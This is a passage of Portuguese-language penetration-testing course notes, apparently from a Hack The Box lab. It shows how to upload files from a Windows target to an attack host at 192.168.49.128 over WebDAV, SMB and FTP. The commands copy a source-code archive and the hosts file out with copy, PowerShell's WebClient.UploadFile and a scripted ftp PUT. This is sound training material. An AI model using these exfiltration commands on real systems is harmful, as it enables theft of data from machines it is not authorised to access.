10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```

#### Conectando-se ao Webdav Share
Agora podemos tentar conectar ao compartilhamento usando o `DavWWWRoot`diretório.

```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

>[!NOTA] **Nota:** `DavWWWRoot` é uma palavra-chave especial reconhecida pelo Windows Shell. Nenhuma pasta desse tipo existe no seu servidor WebDAV. A palavra-chave DavWWWRoot informa ao driver Mini-Redirector, que manipula solicitações WebDAV, que você está se conectando à raiz do servidor WebDAV. Você pode evitar usar esta palavra-chave se especificar uma pasta que exista no seu servidor ao conectar-se ao servidor. Por exemplo: \192.168.49.128\sharefolder

Carregando arquivos usando SMB

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

>[!NOTA] **Observação:** se não houver restrições SMB (TCP/445), você pode usar o impacket-smbserver da mesma forma que o configuramos para operações de download.

## Envios FTP
Carregar arquivos usando FTP é muito parecido com baixar arquivos. Podemos usar o PowerShell ou o cliente FTP para concluir a operação. Antes de iniciarmos nosso Servidor FTP usando o módulo Python `pyftpdlib`, precisamos especificar a opção `--write`para permitir que os clientes carreguem arquivos para nosso host de ataque.

```shell-session
NycolasES6@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

Agora vamos usar a função de upload do PowerShell para enviar um arquivo para nosso servidor FTP.

#### Arquivo de upload do PowerShell
```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### Crie um arquivo de comando para o cliente FTP carregar um arquivo

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```





















































